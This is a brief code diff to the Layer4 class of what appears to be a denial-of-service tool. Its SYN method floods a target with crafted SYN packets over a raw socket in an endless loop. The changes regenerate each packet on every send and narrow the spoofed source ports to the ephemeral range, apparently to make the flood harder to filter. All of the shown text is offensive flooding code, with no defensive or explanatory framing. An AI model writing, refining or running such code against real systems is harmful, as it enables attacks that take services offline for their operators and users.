@@ -485,11 +485,10 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def SYN(self) -> None:
-        payload = self._genrate_syn()
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, self._genrate_syn(), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -569,7 +568,7 @@ class Layer4(Thread):
         tcp.set_SYN()
         tcp.set_th_flags(0x02)
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
+        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
